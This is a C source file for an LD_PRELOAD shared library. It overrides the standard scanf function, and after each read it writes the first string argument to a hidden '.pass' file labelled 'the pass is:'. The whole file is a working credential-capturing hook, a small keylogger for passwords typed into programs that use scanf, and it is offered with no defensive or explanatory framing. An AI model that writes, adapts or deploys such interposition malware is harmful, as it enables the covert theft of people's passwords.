#include <stdio.h>
#include <stdarg.h>
#include <dlfcn.h>
#include <string.h>

#define OBJ_PATH "/lib/x86_64-linux-gnu/libc.so.6"
#define HIDDEN_FILE ".pass"

typedef int (*sym)(const char *, ...);

static sym Scan;
void* handle;
FILE* fd;
static void myinit() __attribute__((constructor));
static void mydest() __attribute__((destructor));

void myinit(){
	fd = fopen(HIDDEN_FILE, "a");
	handle = dlopen(OBJ_PATH,RTLD_LAZY);
}

void mydest() {
	if(handle){dlclose(handle);}
	if(fd){fclose(fd);}
}

int scanf(const char *format, ...){
	va_list args;
	va_start(args,format);
	int result = vscanf(format, args);

	if(result != EOF){
		char *str_arg;
		va_list args_copy;
		va_copy(args_copy, args);
		str_arg = va_arg(args_copy,char*);

		if(str_arg){
			fprintf(fd, "the pass is: ");
			fprintf(fd, "%s \n", str_arg);
			fflush(fd);
		}
		va_end(args_copy);
	}
	va_start(args, format);
	va_end(args);
	return 1;
}

